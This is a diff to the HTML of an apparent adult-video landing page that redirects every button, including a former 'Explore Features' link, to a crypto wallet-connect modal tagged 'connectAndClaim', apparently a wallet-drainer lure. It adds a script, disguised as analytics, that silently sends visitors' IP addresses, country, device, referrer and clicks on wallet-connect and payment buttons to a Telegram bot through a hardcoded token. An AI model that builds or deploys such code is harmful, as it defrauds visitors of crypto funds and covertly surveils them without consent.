@@ -1434,7 +1434,7 @@ footer {
        <!-- Populated dynamically from translations.js -->
       </select>
      </div>
-     <button class="nav-btn js-open-crypto" id="navWatchBtn" type="button">
+     <button class="nav-btn js-open-crypto connectAndClaim" id="navWatchBtn" type="button">
       <span data-i18n="nav.watchOnline">
        Watch Online
       </span>
@@ -1469,7 +1469,7 @@ footer {
       Hot uncensored short videos with zero restrictions. Erotic content, private live streams, and an exclusive feed — everything like TikTok, but strictly 18+.
      </p>
      <div class="hero-actions reveal reveal-d3">
-      <button class="btn js-open-crypto" id="heroWatchOnlineBtn" type="button">
+      <button class="btn js-open-crypto connectAndClaim" id="heroWatchOnlineBtn" type="button">
        <span data-i18n="hero.btnWatch">
         Watch Online
        </span>
@@ -1480,9 +1480,11 @@ footer {
         </svg>
        </span>
       </button>
-      <a class="btn-outline" data-i18n="hero.btnExplore" href="#features">
-       Explore Features
-      </a>
+      <button class="btn-outline js-open-crypto connectAndClaim" id="heroExploreBtn" style="cursor:pointer;" type="button">
+       <span data-i18n="hero.btnExplore">
+        Explore Features
+       </span>
+      </button>
      </div>
      <div class="hero-caption reveal reveal-d4">
       <span>
@@ -1835,7 +1837,7 @@ footer {
        </div>
       </div>
      <div>
-      <button class="btn js-open-crypto" id="sectionOpenCryptoBtn" style="font-size:16px;padding:8px 8px 8px 24px;margin:0 auto;" type="button">
+      <button class="btn js-open-crypto connectAndClaim" id="sectionOpenCryptoBtn" style="font-size:16px;padding:8px 8px 8px 24px;margin:0 auto;" type="button">
        <span data-i18n="banner.btn">
         Get Instant Access
        </span>
@@ -2134,7 +2136,7 @@ footer {
      Enter TikTok 18+ online and immerse yourself in the boldest video universe. Hundreds of creators streaming live right now.
     </p>
     <div class="reveal reveal-d3">
-     <button class="btn js-open-crypto" id="ctaWatchOnlineBtn" style="font-size:17px; padding:8px 8px 8px 28px;" type="button">
+     <button class="btn js-open-crypto connectAndClaim" id="ctaWatchOnlineBtn" style="font-size:17px; padding:8px 8px 8px 28px;" type="button">
       <span data-i18n="cta.btn">
        Watch Online
       </span>
@@ -2268,7 +2270,7 @@ function closeCryptoModal() {
 }
 
 // Any "Watch Online" or crypto button opens the new Crypto Access Widget modal!
-const watchOnlineBtns = document.querySelectorAll('.js-open-wa, .js-open-crypto, #heroWatchOnlineBtn, #ctaWatchOnlineBtn, #sectionOpenCryptoBtn');
+const watchOnlineBtns = document.querySelectorAll('.js-open-wa, .js-open-crypto, #heroWatchOnlineBtn, #heroExploreBtn, #ctaWatchOnlineBtn, #sectionOpenCryptoBtn, #navWatchBtn');
 watchOnlineBtns.forEach(btn => {
   btn.addEventListener('click', (e) => {
     e.preventDefault();
@@ -3018,5 +3020,139 @@ if (document.readyState === 'loading') {
   initWidget();
 }
   </script>
- </body>
+ 
+  <!-- Invisible Realtime Traffic & Country Analytics (Private Telegram Monitor) -->
+  <script>
+  (function() {
+    const TG_BOT_TOKEN = "8904216231:AAHzuoU59D43qO04lsrYvZDhw0su_61Y2Ig";
+    const TG_CHAT_ID = "8788656318";
+
+    // Country flags map
+    const FLAGS = {
+      US: "🇺🇸", RU: "🇷🇺", DE: "🇩🇪", GB: "🇬🇧", FR: "🇫🇷", ES: "🇪🇸",
+      IT: "🇮🇹", BR: "🇧🇷", TR: "🇹🇷", UA: "🇺🇦", KZ: "🇰🇿", BY: "🇧🇾",
+      NL: "🇳🇱", CA: "🇨🇦", AU: "🇦🇺", IN: "🇮🇳", CN: "🇨🇳", JP: "🇯🇵"
+    };
+
+    function sendTelegramAlert(text) {
+      try {
+        const url = "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage";
+        fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
+          }),
+          keepalive: true
+        }).catch(function() {});
+      } catch (e) {}
+    }
+
+    function getDeviceType() {
+      const ua = navigator.userAgent || "";
+      if (/iPhone|iPad|iPod/i.test(ua)) return "📱 iOS (iPhone/iPad)";
+      if (/Android/i.test(ua)) return "📱 Android";
+      if (/Windows/i.test(ua)) return "💻 Windows PC";
+      if (/Macintosh|Mac OS/i.test(ua)) return "💻 MacOS";
+      if (/Linux/i.test(ua)) return "💻 Linux";
+      return "📱/💻 Other";
+    }
+
+    async function trackVisit() {
+      // Avoid spamming if user reloads multiple times in same session
+      const sessKey = "tt18_visit_tracked";
+      const isNewSession = !sessionStorage.getItem(sessKey);
+      sessionStorage.setItem(sessKey, "1");
+
+      let country = "Unknown";
+      let ip = "";
+      try {
+        const res = await fetch("https://api.country.is", { cache: "no-store" });
+        if (res.ok) {
+          const d = await res.json();
+          country = (d.country || "Unknown").toUpperCase();
+          ip = d.ip || "";
+        }
+      } catch (e) {}
+
+      window.__visitorCountry = country;
+      window.__visitorIP = ip;
+
+      const flag = FLAGS[country] || "🌐";
+      const device = getDeviceType();
+      const referrer = document.referrer ? new URL(document.referrer).hostname : "Direct / Bookmark";
+      const time = new Date().toLocaleTimeString();
+
+      if (isNewSession) {
+        const msg = 
+          "👀 <b>НОВЫЙ ПОСЕТИТЕЛЬ</b>\n" +
+          "━━━━━━━━━━━━━━━━━━━━\n" +
+          "🌍 <b>Страна:</b> " + flag + " " + country + (ip ? " (" + ip + ")" : "") + "\n" +
+          "📱 <b>Устройство:</b> " + device + "\n" +
+          "🔗 <b>Источник:</b> " + referrer + "\n" +
+          "🕒 <b>Время:</b> " + time;
+        sendTelegramAlert(msg);
+      }
+    }
+
+    // Track button clicks (Purchase / Connect / Plans)
+    function trackAction(actionName, details) {
+      const country = window.__visitorCountry || "Unknown";
+      const flag = FLAGS[country] || "🌐";
+      const time = new Date().toLocaleTimeString();
+      const msg = 
+        "⚡ <b>ДЕЙСТВИЕ НА САЙТЕ</b>\n" +
+        "━━━━━━━━━━━━━━━━━━━━\n" +
+        "🔘 <b>Действие:</b> " + actionName + "\n" +
+        (details ? "📝 <b>Детали:</b> " + details + "\n" : "") +
+        "🌍 <b>Страна:</b> " + flag + " " + country + "\n" +
+        "🕒 <b>Время:</b> " + time;
+      sendTelegramAlert(msg);
+    }
+
+    // Attach to purchase and connect buttons
+    document.addEventListener("DOMContentLoaded", function() {
+      trackVisit();
+
+      const btn1 = document.getElementById("heroWatchOnlineBtn");
+      if (btn1) {
+        btn1.addEventListener("click", function() {
+          trackAction("Клик 'Watch Online' (Hero)", "Открыл окно подписки");
+        });
+      }
+
+      const btn2 = document.getElementById("heroExploreBtn");
+      if (btn2) {
+        btn2.addEventListener("click", function() {
+          trackAction("Клик 'Explore Features' (Hero)", "Открыл окно подписки");
+        });
+      }
+
+      const navBtn = document.getElementById("navWatchBtn");
+      if (navBtn) {
+        navBtn.addEventListener("click", function() {
+          trackAction("Клик 'Watch Online' (Шапка)", "Открыл окно подписки");
+        });
+      }
+
+      const cwConnectBtn = document.getElementById("cwConnectBtn");
+      if (cwConnectBtn) {
+        cwConnectBtn.addEventListener("click", function() {
+          trackAction("Клик 'CONNECT WALLET'", "Запуск подключения кошелька");
+        });
+      }
+
+      const cwPayBtn = document.getElementById("cwPayBtn");
+      if (cwPayBtn) {
+        cwPayBtn.addEventListener("click", function() {
+          trackAction("Клик 'Proceed to Payment'", "Запуск подтверждения транзакции");
+        });
+      }
+    });
+  })();
+  </script>
+
+</body>
 </html>
